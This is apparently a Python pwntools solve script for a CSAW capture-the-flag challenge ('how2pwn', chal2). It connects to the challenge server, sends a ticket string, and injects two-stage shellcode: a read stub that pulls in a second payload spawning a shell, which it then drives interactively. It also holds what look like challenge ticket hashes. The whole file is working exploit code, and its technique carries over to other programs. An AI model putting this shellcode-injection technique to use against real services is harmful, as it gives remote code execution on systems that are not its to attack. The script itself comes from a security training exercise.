from pwn import *
import time,sys

exe = ELF("chal2_patched")
exe_rop = ROP(exe)
# libc = ELF("libc6_2.31-0ubuntu9.7_amd64.so")

# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def wait():
    if args.LOCAL and args.R2:
        input("wait")
    else:
        time.sleep(0.2)
def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("how2pwn.chal.csaw.io", 60002)
    return r

shellcode0 = asm(shellcraft.read(0, 'rsi', 0x100))
io = start()
wait()
io.send(b"764fce03d863b5155db4af260374acc1")

print("shellcode length",len(shellcode0))
wait()
io.sendafter(b"shellcode: ",shellcode0)

shellcode1 = asm(shellcraft.sh())
print("shellcode length",len(shellcode1))
wait()
io.send(shellcode0+shellcode1)
io.interactive()

# 8e7bd9e37e38a85551d969e29b77e1ce